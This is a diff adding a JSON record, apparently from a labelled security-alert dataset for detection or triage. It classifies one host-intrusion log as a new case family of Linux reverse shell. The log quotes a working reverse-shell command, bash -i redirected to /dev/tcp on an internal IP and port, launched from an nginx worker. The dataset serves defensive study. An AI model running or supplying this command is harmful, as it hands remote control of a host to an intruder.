@@ -1,0 +1,25 @@
+{
+ "unit": 1044,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Linux 反连 shell（bash -i 重定向 /dev/tcp）",
+ "sources": [
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-19 05:44:24",
+   "source": "hids",
+   "log_id": "HID0353559",
+   "content": "bash -i >& /dev/tcp/10.20.5.19/8443 0>&1 /bin/bash bash -i <== /bin/sh -c 'bash -i' <== nginx: worker process",
+   "event_id": "1044-HID0353559"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
